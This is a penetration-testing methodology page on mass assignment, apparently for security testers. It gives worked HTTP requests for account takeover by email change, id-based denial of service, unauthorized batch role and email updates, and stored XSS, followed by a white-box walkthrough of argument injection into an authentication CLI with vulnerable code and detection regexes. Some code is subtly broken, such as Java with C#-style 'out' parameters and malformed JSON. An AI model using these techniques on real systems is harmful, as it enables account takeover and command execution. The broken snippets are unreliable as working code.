# Mass Assignment

## Check List

## Methodology

### Black Box

#### HTTP Method Override (PUT) in User APIs

{% stepper %}
{% step %}
Find API documentation in the target
{% endstep %}

{% step %}
Check the target API documentation to see if there is a path like `api/user` or check the API requests in Burp Suite to see if such a path is visible
{% endstep %}

{% step %}
Make a simple request with a simple GET method and check the request to make sure there are no problems with it
{% endstep %}

{% step %}
Then make the request as POST and if it gives an error, check to see what methods the Allow header in the response refers to
{% endstep %}

{% step %}
If the PUT method is present in the Allow response header, change the method to PUT and make the request
{% endstep %}

{% step %}
If it gives a `400` error, send the content type to `application/json` and an empty body `{}`
{% endstep %}

{% step %}
Then check whether the server response gives an error for missing a parameter
{% endstep %}

{% step %}
Put the parameter mentioned in the server response into the request, send it, and check whether the server response has changed or not
{% endstep %}

{% step %}
Then send different numeric or string values ​​such as 1 or Admin into the parameter and if information is extracted in the server response, the vulnerability has been exploited
{% endstep %}
{% endstepper %}

***

#### [Account Takeover via Unvalidated Profile Email Change](https://swisskyrepo.github.io/PayloadsAllTheThings/Mass%20Assignment/#methodology)

{% stepper %}
{% step %}
logging into the application with a normal user account
{% endstep %}

{% step %}
Once logged in, I accessed the Profile Edit Page, where users can update their personal details such as name, email, and phone number
{% endstep %}

{% step %}
Using Burp Suite, I intercepted the request sent to the server when updating profile data. The original request looked like this

```json
POST /api/pcsx/profile_edit HTTP/2
Host: example.com
Accept: application/json, text/plain,

{
    "op_section": "basic_info",
    "operation": "edit",
    "op_data": {
        "value": {
            "firstname": "Test",
            "lastname": "1",
            "phone": "+2010********",
            "location": "anywhere",
            "email": "user@gmail.com"
        }
    }
}
```
{% endstep %}

{% step %}
Modifying Sensitive Fields: I edited the **email** field to an arbitrary address (`victim@gmail.com`), simulating an attack where an attacker hijacks an account by changing the registered email and change the username to victim

```json
POST /api/pcsx/profile_edit HTTP/2
Host: example.com
ccept: application/json, text/plain, /
{"op_section": "basic_info",
    "operation": "edit",
    "op_data": {
        "value": {
            "firstname": "victim",
            "lastname": "1",
            "phone": "+2010********",
            "location": "anywhere",
            "email": "victim@gmail.com"
        }
    }
}
```
{% endstep %}

{% step %}
Sending the Request & Observing the Response
{% endstep %}

{% step %}
After forwarding the modified request, I received a **200 OK** response, confirming that the changes were applied **without validation**

```json
HTTP/2 200 OK
Content-Type: application/json

{
    "data": {
        "avatar": "",
        "fullname": "Victim 1",
        "firstname": "Victim",
        "lastname": "1",
        "email": "victim@gmail.com",
        "location": "anywhere",
        "phone": "+2010********",
    }
}
```
{% endstep %}

{% step %}
refreshed the profile page and saw that the email change was applied, proving that there were no validation checks in place. At this point, an attacker could request a password reset to the newly assigned email and gain full control of the victim’s account
{% endstep %}
{% endstepper %}

***

#### Parameter Tampering

{% stepper %}
{% step %}
Find any "`Add`", "`Create`", or "`Register`" form that sends `JSON`
{% endstep %}

{% step %}
Check the request in Burp Suite to locate the main nested object (`patient`, `user`, `item`) and confirm id is not present in the request but appears in the response
{% endstep %}

{% step %}
Make a normal POST request with valid data and verify the response creates a new record with an auto-incremented id

```json
POST /api/add
{
  "user": {
    "name": "John",
    "email": "john@example.com"
  }
}
```

and Response&#x20;

```json
{ "id": 100, "user": { "id": 100, "name": "John" } }
```
{% endstep %}

{% step %}
Then inject `"id": 999999` inside the nested object (`"patient": {"id": 999999, ...}`) and send the request

```json
{
  "patient": {
    "id": 999999,
    "firstName": "Test",
    "phone": "123456"
  }
}
```
{% endstep %}

{% step %}
If Vulnerable Response

```json
{ "patientId": 999999, "patient": { "id": 999999 } }
```
{% endstep %}

{% step %}
If the response reflects `"id": 999999` in both patientId and patient.id, mass assignment is confirmed

Then inject a very high unused id like 1000000000 and check if the next normal creation skips to 1000000001

```json
{ "user": { "id": 1000000000, "name": "Skip" } }
```
{% endstep %}

{% step %}
Then inject an extremely large value like `1e99` to trigger a database error and extract the max allowed id (usually `9223372036854775807`)

```json
{ "item": { "id": 1e99, "title": "Test" } }
```

Error Example

```json
{ "error": "Value out of range. Max: 9223372036854775807" }
```
{% endstep %}

{% step %}
Then inject the maximum id value 9223372036854775807 and confirm the record is created

```json
{ "device": { "id": 9223372036854775807, "name": "Last" } }
```
{% endstep %}

{% step %}
Then attempt to create a new record normally and if it fails with DuplicateKeyException, global DoS is achieved
{% endstep %}
{% endstepper %}

***

#### Insecure Batch API Processing

{% stepper %}
{% step %}
Find any batch operation API that accepts multiple actions in one request
{% endstep %}

{% step %}
Check the API documentation or Burp Suite history for endpoints like `/api/*/batch`, `/batch`, `/bulk`, or `/api/v1/users/batch`
{% endstep %}

{% step %}
Make a normal `PATCH` or `POST` request with a single valid update and verify the response shows success

```json
PATCH /api/v1/users/batch
[
  {
    "id": 1001,
    "operation": "update",
    "body": { "email": "test@legit.com" }
  }
]
```
{% endstep %}

{% step %}
Expected Response

```json
[{ "id": 1001, "status": "success" }]
```
{% endstep %}

{% step %}
Then send a batch request updating multiple user IDs with sensitive fields like email, balance, role, or `api_key` Example Payload

```json
[
  {
    "id": 1001,
    "operation": "update",
    "body": { "email": "hacked1@evil.com", "balance": 10000 }
  },
  {
    "id": 1002,
    "operation": "update",
    "body": { "email": "hacked2@evil.com", "role": "admin" }
  }
]
```
{% endstep %}

{% step %}
If Vulnerable Response

```json
[{ "status": "success" }, { "status": "success" }]
```
{% endstep %}

{% step %}
If the response confirms updates on other users' data without authorization, IDOR + Mass Assignment is confirmed
{% endstep %}
{% endstepper %}

***

#### Mass-Assignment Led To Stored-XSS

{% stepper %}
{% step %}
Find any API endpoint that accepts JSON input and updates or creates chat, widget, or message objects
{% endstep %}

{% step %}
Check the API documentation or Burp Suite history for endpoints like `/api/chat`, `/api/widget,` `/api/message`, `/api/update`, or /`api/config`
{% endstep %}

{% step %}
Make a normal POST or PATCH request with valid data and verify the response stores the input

```json
POST /api/v1/cache/{id}/invalidate HTTP/1.1
Host: localhost:8080
Content-Length: 54
Content-Type: application/json
User-Agent: PostmanRuntime/7.26.8
Accept: *
Cache-Control: no-cache
Postman-Token: <random-uuid>
Connection: keep-alive

{
    "test": "test",
    "transactionId": 1,
    "key": "chichi4"
}
```
{% endstep %}

{% step %}
Expected Response

```json
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET,POST
Cache-Control: no-cache
Pragma: no-cache
Content-Type: application/json; charset=UTF-8
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-RateLimit-Limit: 1000
X-RateLimit-Remaining: 999
X-RateLimit-Reset: 1730810744
Content-Length: 297
Date: Wed, 05 Nov 2025 10:07:44 GMT

{
    "transactionId": 1,
    "quintanaCacheInfo": {
        "transactionId": 1,
        "cacheName": "testCache",
        "operation": "INVALIDATE",
        "key": "chichi4",
        "Html": "",
        "status": "SUCCESS",
        "timestamp": 1730810744.123456789,
        "nodeId": "node-01",
        "result": true
    },
    "type": 1000,
    "success": true,
    "message": "Cache invalidated successfully",
    "isSuccess": true,
    "application": "false",
    "timestamp": 1730810744
}
```
{% endstep %}

{% step %}
Then inject HTML-related fields like `html`, markup, `bodyHtml`, or `domKey` with a test payload

```json
POST /api/v1/cache/{id}/invalidate HTTP/1.1
Host: localhost:8080
Content-Length: 54
Content-Type: application/json
User-Agent: PostmanRuntime/7.26.8
Accept: *
Cache-Control: no-cache
Postman-Token: <random-uuid>
Connection: keep-alive

{
    "test": "test",
    "transactionId": 1,
    "key": "chichi4"
    "html": ""><script>alert(1)</script>"
}
```
{% endstep %}

{% step %}
If Vulnerable Response

```json
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET,POST
Cache-Control: no-cache
Pragma: no-cache
Content-Type: application/json; charset=UTF-8
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-RateLimit-Limit: 1000
X-RateLimit-Remaining: 999
X-RateLimit-Reset: 1730810744
Content-Length: 297
Date: Wed, 05 Nov 2025 10:07:44 GMT

{
    "transactionId": 1,
    "quintanaCacheInfo": {
        "transactionId": 1,
        "cacheName": "testCache",
        "operation": "INVALIDATE",
        "key": "chichi4",
        "Html": ""><script>alert(1)</script>",
        "status": "SUCCESS",
        "timestamp": 1730810744.123456789,
        "nodeId": "node-01",
        "result": true
    },
    "type": 1000,
    "success": true,
    "message": "Cache invalidated successfully",
    "isSuccess": true,
    "application": "false",
    "timestamp": 1730810744
}
```
{% endstep %}

{% step %}
If the response stores the HTML without stripping, mass assignment to HTML sink is confirmed
{% endstep %}
{% endstepper %}

***

### White Box

#### Mass-Assignment To Command Injection&#x20;

#### Path Traversal to RCE

{% stepper %}
{% step %}
Map the entire target system or product using the Burp Suite tool
{% endstep %}

{% step %}
Draw the entry points and endpoints in XMind
{% endstep %}

{% step %}
Decompile the application based on the programming language used
{% endstep %}

{% step %}
In the service, find a feature that creates its own custom command-line interface (such as `cmd`)
{% endstep %}

{% step %}
Then identify the switches and commands in this command-line interface that are related to authentication
{% endstep %}

{% step %}
In the code, find the authentication endpoint processing logic (like in the code below). Determine the request type and review the inputs it receives

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpPost("Login")]
public IActionResult Login([FromBody] CheckCredentialReq req) // [1]
{
    CheckCredentialResp checkCredentialResp = new CheckCredentialResp();
    this.ValidateLoginInput(req);

    try
    {
        var stopwatch = new Stopwatch();
        stopwatch.Start();

        checkCredentialResp = new AuthenticationCore().DoLogin(req); // [2]

        stopwatch.Stop();
        base.logger.LogInfo(
            $"Total time taken to execute login: [{stopwatch.Elapsed.TotalSeconds:0.00}] second(s)",
            "Login",
            57
        );
    }
    catch (Exception ex)
    {
        base.logger.LogError(ex.Message + " : " + ex.StackTrace, "Login", 61);
        checkCredentialResp.errList = checkCredentialResp?.errList ?? new List<Error>();

        if (checkCredentialResp.errList.Count == 0)
        {
            checkCredentialResp.errList.Add(new Error
            {
                errorCode = 500,
                errLogMessage = "Internal server error."
            });
        }
    }

    return this.Ok(checkCredentialResp);
}
```
{% endtab %}

{% tab title="Java" %}
```java
@PostMapping("Login")
public ResponseEntity<CheckCredentialResp> login(@RequestBody CheckCredentialReq req) { // [1]

    CheckCredentialResp checkCredentialResp = new CheckCredentialResp();
    this.validateLoginInput(req);

    try {
        long startTime = System.currentTimeMillis();

        checkCredentialResp = new AuthenticationCore().doLogin(req); // [2]

        long endTime = System.currentTimeMillis();
        double elapsedSeconds = (endTime - startTime) / 1000.0;

        logger.info(String.format("Total time taken to execute login: [%.2f] second(s)", elapsedSeconds));
    } catch (Exception ex) {
        logger.error(ex.getMessage() + " : " + Arrays.toString(ex.getStackTrace()));

        if (checkCredentialResp == null || checkCredentialResp.getErrList() == null) {
            checkCredentialResp.setErrList(new ArrayList<>());
        }

        if (checkCredentialResp.getErrList().isEmpty()) {
            checkCredentialResp.getErrList().add(new Error(500, "Internal server error."));
        }
    }

    return ResponseEntity.ok(checkCredentialResp);
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public function login(CheckCredentialReq $req)
{
    $checkCredentialResp = new CheckCredentialResp();
    $this->validateLoginInput($req);

    try {
        $start = microtime(true);

        $checkCredentialResp = (new AuthenticationCore())->doLogin($req); // [2]

        $end = microtime(true);
        $elapsed = $end - $start;
        $this->logger->info(sprintf("Total time taken to execute login: [%.2f] second(s)", $elapsed));
    } catch (Exception $ex) {
        $this->logger->error($ex->getMessage() . " : " . $ex->getTraceAsString());

        if (!isset($checkCredentialResp->errList) || $checkCredentialResp->errList === null) {
            $checkCredentialResp->errList = [];
        }

        if (count($checkCredentialResp->errList) === 0) {
            $checkCredentialResp->errList[] = (object)[
                'errorCode' => 500,
                'errLogMessage' => 'Internal server error.'
            ];
        }
    }

    return $this->ok($checkCredentialResp);
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
router.post('/Login', async (req, res) => { // [1]
    let checkCredentialResp = {};

    try {
        const start = Date.now();

        checkCredentialResp = await new AuthenticationCore().doLogin(req.body); // [2]

        const elapsed = (Date.now() - start) / 1000;
        logger.info(`Total time taken to execute login: [${elapsed.toFixed(2)}] second(s)`);
    } catch (ex) {
        logger.error(`${ex.message} : ${ex.stack}`);

        if (!checkCredentialResp.errList) {
            checkCredentialResp.errList = [];
        }

        if (checkCredentialResp.errList.length === 0) {
            checkCredentialResp.errList.push({
                errorCode: 500,
                errLogMessage: "Internal server error."
            });
        }
    }

    res.json(checkCredentialResp);
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Review the code flow and the used functions to check whether, under certain conditions, user input can be passed to the authentication switch in the command-line interface. (In this example, the authentication switch in the CLI is `QLogin`, which is used in line `[1]` in the code below

{% tabs %}
{% tab title="C#" %}
```csharp
private bool DoRemoteCSLogin(CheckCredentialReq loginRequest, ref CheckCredentialResp loginResponse)
{
    int num = 0;
    string empty = string.Empty;
    bool flag = !loginRequest.usernameFieldSpecified;
    bool result;

    if (flag)
    {
        base.logger.LogError("username is not specified. Invalid remote CS login.", "DoRemoteCSLogin", 2154);
        this.FillLoginResponseWithError(ref loginResponse, num, empty, 1127, "unknown error", "");
        result = false;
    }
    else
    {
        bool flag2 = !this.DecodePass(ref loginRequest, ref loginResponse);
        if (flag2)
        {
            result = false;
        }
        else
        {
            loginRequest.username = this.GetFullUsername(loginRequest);
            string commserverName = loginRequest.commserver.Split('*')[0];

            string text;
            string text2;
            num = new QLogin().DoQlogin(loginRequest.commserver, loginRequest.username, loginRequest.password, out text, out text2, out empty, 5, false); // [1]

            bool flag3 = num == 0;
            if (flag3)
            {
                base.logger.LogTrace("Commcell login succeeded for user " + loginRequest.username + " for Commserver " + loginRequest.commserver, "DoRemoteCSLogin", 2175);

                int value;
                string text3;
                num = new QLogin().GetQSDKUserInfo(commserverName, loginRequest.username, text, out value, out text3, out empty); // [2]

                bool flag4 = num == 0;
                if (flag4)
                {
                    // ...
                }
            }
        }
    }

    return result;
}
```
{% endtab %}

{% tab title="Java" %}
```java
private boolean doRemoteCSLogin(CheckCredentialReq loginRequest, CheckCredentialResp loginResponse) {
    int num = 0;
    String empty = "";
    boolean result;

    boolean flag = !loginRequest.isUsernameFieldSpecified();
    if (flag) {
        logger.error("username is not specified. Invalid remote CS login.");
        fillLoginResponseWithError(loginResponse, num, empty, 1127, "unknown error", "");
        result = false;
    } else {
        boolean flag2 = !decodePass(loginRequest, loginResponse);
        if (flag2) {
            result = false;
        } else {
            loginRequest.setUsername(getFullUsername(loginRequest));
            String commserverName = loginRequest.getCommserver().split("\\*")[0];

            String text;
            String text2;
            num = new QLogin().doQlogin(loginRequest.getCommserver(), loginRequest.getUsername(), loginRequest.getPassword(), out text, out text2, out empty, 5, false); // [1]

            boolean flag3 = num == 0;
            if (flag3) {
                logger.trace("Commcell login succeeded for user " + loginRequest.getUsername() +
                             " for Commserver " + loginRequest.getCommserver());

                int value;
                String text3;
                num = new QLogin().getQSDKUserInfo(commserverName, loginRequest.getUsername(), text, out value, out text3, out empty); // [2]

                boolean flag4 = num == 0;
                if (flag4) {
                    // ...
                }
            }
        }
    }

    return result;
}
```
{% endtab %}

{% tab title="PHP" %}
```php
private function doRemoteCSLogin($loginRequest, &$loginResponse) {
    $num = 0;
    $empty = "";
    $result = false;

    $flag = !$loginRequest->usernameFieldSpecified;
    if ($flag) {
        $this->logger->error("username is not specified. Invalid remote CS login.");
        $this->fillLoginResponseWithError($loginResponse, $num, $empty, 1127, "unknown error", "");
        $result = false;
    } else {
        $flag2 = !$this->decodePass($loginRequest, $loginResponse);
        if ($flag2) {
            $result = false;
        } else {
            $loginRequest->username = $this->getFullUsername($loginRequest);
            $commserverName = explode('*', $loginRequest->commserver)[0];

            $text = null;
            $text2 = null;
            $num = (new QLogin())->doQlogin($loginRequest->commserver, $loginRequest->username, $loginRequest->password, $text, $text2, $empty, 5, false); // [1]

            $flag3 = $num === 0;
            if ($flag3) {
                $this->logger->trace("Commcell login succeeded for user {$loginRequest->username} for Commserver {$loginRequest->commserver}");

                $value = null;
                $text3 = null;
                $num = (new QLogin())->getQSDKUserInfo($commserverName, $loginRequest->username, $text, $value, $text3, $empty); // [2]

                $flag4 = $num === 0;
                if ($flag4) {
                    // ...
                }
            }
        }
    }

    return $result;
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
function doRemoteCSLogin(loginRequest, loginResponse) {
    let num = 0;
    let empty = "";
    let result = false;

    const flag = !loginRequest.usernameFieldSpecified;
    if (flag) {
        logger.error("username is not specified. Invalid remote CS login.");
        fillLoginResponseWithError(loginResponse, num, empty, 1127, "unknown error", "");
        result = false;
    } else {
        const flag2 = !decodePass(loginRequest, loginResponse);
        if (flag2) {
            result = false;
        } else {
            loginRequest.username = getFullUsername(loginRequest);
            const commserverName = loginRequest.commserver.split('*')[0];

            let text, text2;
            num = (new QLogin()).doQlogin(loginRequest.commserver, loginRequest.username, loginRequest.password, (t, t2, e) => { text = t; text2 = t2; empty = e; }, 5, false); // [1]

            const flag3 = num === 0;
            if (flag3) {
                logger.trace(`Commcell login succeeded for user ${loginRequest.username} for Commserver ${loginRequest.commserver}`);

                let value, text3;
                num = (new QLogin()).getQSDKUserInfo(commserverName, loginRequest.username, text, (v, t3, e) => { value = v; text3 = t3; empty = e; }); // [2]

                const flag4 = num === 0;
                if (flag4) {
                    // ...
                }
            }
        }
    }

    return result;
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Enter the function and check whether the inputs and arguments used for `QLogin` are placed directly into command instructions. (In the example below, `commserver`, which is user input, is used as `text` and `text2` in the code above

**VSCode (Regex Detection)**

{% tabs %}
{% tab title="C#" %}
```regex
(string\.Format\s*\()|(\$\s*".*-\w+\s*\{.*\}")|(Process(StartInfo)?\s*\()|(handleQAPIReq\s*\()|(Split\s*\(\s*['"].\*['"])
```
{% endtab %}

{% tab title="Java" %}
```regex
(String\.format\s*\()|(\$\s*".*-\w+\s*\{.*\}")|(Runtime\.getRuntime\(\)\.exec)|(ProcessBuilder\s*\()
```
{% endtab %}

{% tab title="PHP" %}
```regex
(sprintf\s*\()|(`.*\$\w+.*`)|(shell_exec\s*\()|(exec\s*\()|(system\s*\()
```
{% endtab %}

{% tab title="Node.js" %}
```regex
(exec\s*\()|(spawn\s*\()|(child_process)|(template\s*string\s*`.*-\w+\$\{.*\}`)
```


{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection(Linux))**

{% tabs %}
{% tab title="C#" %}
```regex
string\.Format\s*\(|\$\s*".*-\w+\s*\{.*\}"|Process(StartInfo)?\s*\(|handleQAPIReq\s*\(|Split\s*\(\s*['"].\*['"]
```
{% endtab %}

{% tab title="Java" %}
```regex
String\.format\s*\(|\$\s*".*-\w+\s*\{.*\}"|Runtime\.getRuntime\(\)\.exec|ProcessBuilder\s*\(
```
{% endtab %}

{% tab title="PHP" %}
```regex
sprintf\s*\(|`.*\$\w+.*`|shell_exec\s*\(|exec\s*\(|system\s*\(
```
{% endtab %}

{% tab title="Node.js" %}
```regex
exec\s*\(|spawn\s*\(|child_process|`.*-\w+\$\{.*\}`
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
internal int DoQlogin(string commserverName, string userName, string password, out string token, out string qsdkGuid, out string errorString, int samlTokenValidityInMins = 5, bool isCreateSamlTokenRequest = false)
{
    string[] array = commserverName.Split('*', StringSplitOptions.None);
    string text = array[0];
    string text2 = string.IsNullOrEmpty(this.csClientName) ? text : this.csClientName;
    string text3;
    errorString = text3 = string.Empty;
    qsdkGuid = text3;
    token = text3;

    if (array.Length > 1)
    {
        text2 = array[1];
    }

    string commandParameters = string.Empty;

    if (isCreateSamlTokenRequest)
    {
        commandParameters = string.Format("-cs {0} -csn {1} -getsamlToken -gt -u {2} -clp {3} -validformins {4} -featureType {5}",
            text, text2, userName, password, samlTokenValidityInMins, this.SAMLTokenFeatureType); // [1]
    }
    else
    {
        commandParameters = string.Format(" -cs {0} -csn {1} -gt -u {2} -clp {3} ",
            text, text2, userName, password); // [2]
    }

    string pinfoXML = QLogin.GetPInfoXML(0, string.Empty, 0,
        Convert.ToInt32(QLogin.QCOMMANDS.QCOMMAND_LOGIN).ToString(),
        Convert.ToInt32(QLogin.QAPI_OperationSubType.QQAPI_OPERATION_NOSUBCOMMAND).ToString(),
        0U, commandParameters, commserverName, null, false, null); // [3]

    string empty = string.Empty;
    string empty2 = string.Empty;
    int num = new QAPICommandCppSharp().handleQAPIReq(pinfoXML, empty, ref empty2); // [4]

    if (num == 0)
    {
        token = empty2;
        if (!isCreateSamlTokenRequest)
        {
            string xml = CVWebConf.GetDecryptedPassword(token);
            QAllTokenInfo qallTokenInfo = new QAllTokenInfo();
            XMLDecoder.ReadXml(xml, qallTokenInfo);
            qsdkGuid = CVWebConf.decodePass(Convert.ToBase64String(qallTokenInfo.tokenInfo[0].guid));
        }
    }

    return num;
}
```
{% endtab %}

{% tab title="Java" %}
```java
int doQlogin(String commserverName, String userName, String password, Holder<String> token, Holder<String> qsdkGuid, Holder<String> errorString, int samlTokenValidityInMins, boolean isCreateSamlTokenRequest) {
    String[] array = commserverName.split("\\*");
    String text = array[0];
    String text2 = (this.csClientName == null || this.csClientName.isEmpty()) ? text : this.csClientName;
    String text3 = "";
    errorString.value = text3;
    qsdkGuid.value = text3;
    token.value = text3;

    if (array.length > 1) {
        text2 = array[1];
    }

    String commandParameters = "";
    if (isCreateSamlTokenRequest) {
        commandParameters = String.format("-cs %s -csn %s -getsamlToken -gt -u %s -clp %s -validformins %d -featureType %s",
            text, text2, userName, password, samlTokenValidityInMins, this.SAMLTokenFeatureType); // [1]
    } else {
        commandParameters = String.format(" -cs %s -csn %s -gt -u %s -clp %s ", text, text2, userName, password); // [2]
    }

    String pinfoXML = QLogin.getPInfoXML(0, "", 0,
        Integer.toString(QLogin.QCOMMANDS.QCOMMAND_LOGIN.ordinal()),
        Integer.toString(QLogin.QAPI_OperationSubType.QQAPI_OPERATION_NOSUBCOMMAND.ordinal()),
        0, commandParameters, commserverName, null, false, null); // [3]

    String empty = "";
    StringHolder empty2 = new StringHolder("");
    int num = new QAPICommandCppSharp().handleQAPIReq(pinfoXML, empty, empty2); // [4]

    if (num == 0) {
        token.value = empty2.value;
        if (!isCreateSamlTokenRequest) {
            String xml = CVWebConf.getDecryptedPassword(token.value);
            QAllTokenInfo qallTokenInfo = new QAllTokenInfo();
            XMLDecoder.readXml(xml, qallTokenInfo);
            qsdkGuid.value = CVWebConf.decodePass(Base64.getEncoder().encodeToString(qallTokenInfo.tokenInfo[0].guid));
        }
    }

    return num;
}
```
{% endtab %}

{% tab title="PHP" %}
```php
function doQlogin($commserverName, $userName, $password, &$token, &$qsdkGuid, &$errorString, $samlTokenValidityInMins = 5, $isCreateSamlTokenRequest = false) {
    $array = explode('*', $commserverName);
    $text = $array[0];
    $text2 = empty($this->csClientName) ? $text : $this->csClientName;
    $text3 = "";
    $errorString = $text3;
    $qsdkGuid = $text3;
    $token = $text3;

    if (count($array) > 1) {
        $text2 = $array[1];
    }

    if ($isCreateSamlTokenRequest) {
        $commandParameters = sprintf("-cs %s -csn %s -getsamlToken -gt -u %s -clp %s -validformins %d -featureType %s",
            $text, $text2, $userName, $password, $samlTokenValidityInMins, $this->SAMLTokenFeatureType); // [1]
    } else {
        $commandParameters = sprintf(" -cs %s -csn %s -gt -u %s -clp %s ", $text, $text2, $userName, $password); // [2]
    }

    $pinfoXML = QLogin::getPInfoXML(0, "", 0, strval(QLogin::QCOMMANDS['QCOMMAND_LOGIN']), strval(QLogin::QAPI_OperationSubType['QQAPI_OPERATION_NOSUBCOMMAND']), 0, $commandParameters, $commserverName, null, false, null); // [3]

    $empty = "";
    $empty2 = "";
    $num = (new QAPICommandCppSharp())->handleQAPIReq($pinfoXML, $empty, $empty2); // [4]

    if ($num === 0) {
        $token = $empty2;
        if (!$isCreateSamlTokenRequest) {
            $xml = CVWebConf::getDecryptedPassword($token);
            $qallTokenInfo = new QAllTokenInfo();
            XMLDecoder::readXml($xml, $qallTokenInfo);
            $qsdkGuid = CVWebConf::decodePass(base64_encode($qallTokenInfo->tokenInfo[0]->guid));
        }
    }

    return $num;
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
function doQlogin(commserverName, userName, password, callback, samlTokenValidityInMins = 5, isCreateSamlTokenRequest = false) {
    let array = commserverName.split('*');
    let text = array[0];
    let text2 = !this.csClientName ? text : this.csClientName;
    let token = "";
    let qsdkGuid = "";
    let errorString = "";

    if (array.length > 1) {
        text2 = array[1];
    }

    let commandParameters = "";
    if (isCreateSamlTokenRequest) {
        commandParameters = `-cs ${text} -csn ${text2} -getsamlToken -gt -u ${userName} -clp ${password} -validformins ${samlTokenValidityInMins} -featureType ${this.SAMLTokenFeatureType}`; // [1]
    } else {
        commandParameters = ` -cs ${text} -csn ${text2} -gt -u ${userName} -clp ${password} `; // [2]
    }

    let pinfoXML = QLogin.getPInfoXML(0, "", 0, QLogin.QCOMMANDS.QCOMMAND_LOGIN.toString(),
        QLogin.QAPI_OperationSubType.QQAPI_OPERATION_NOSUBCOMMAND.toString(),
        0, commandParameters, commserverName, null, false, null); // [3]

    let empty = "";
    let empty2 = "";
    let num = new QAPICommandCppSharp().handleQAPIReq(pinfoXML, empty, (res) => { empty2 = res; }); // [4]

    if (num === 0) {
        token = empty2;
        if (!isCreateSamlTokenRequest) {
            let xml = CVWebConf.getDecryptedPassword(token);
            let qallTokenInfo = new QAllTokenInfo();
            XMLDecoder.readXml(xml, qallTokenInfo);
            qsdkGuid = CVWebConf.decodePass(Buffer.from(qallTokenInfo.tokenInfo[0].guid).toString('base64'));
        }
    }

    return num;
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
After reaching `QLogin`, which performs authentication commands, review the CLI switches responsible for authentication and check whether there is a switch or feature related to admin access or obtaining a valid admin token (such as `localadmin-`)
{% endstep %}

{% step %}
First, test with a low-privilege or local user to see whether this feature works and grants a high-level role or token. If not, review the CLI processor and check whether it uses `dotnet.exe`, since this processor may run with `SYSTEM-level` privileges
{% endstep %}

{% step %}
Due to improper input validation and sanitization of user-supplied arguments in the CLI, it may be possible to inject the desired switch into a user-controlled parameter (such as the Password field) and send the request
{% endstep %}

{% step %}
If you encounter issues obtaining the admin username or related information, review the database to identify the admin username and then resend the request
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
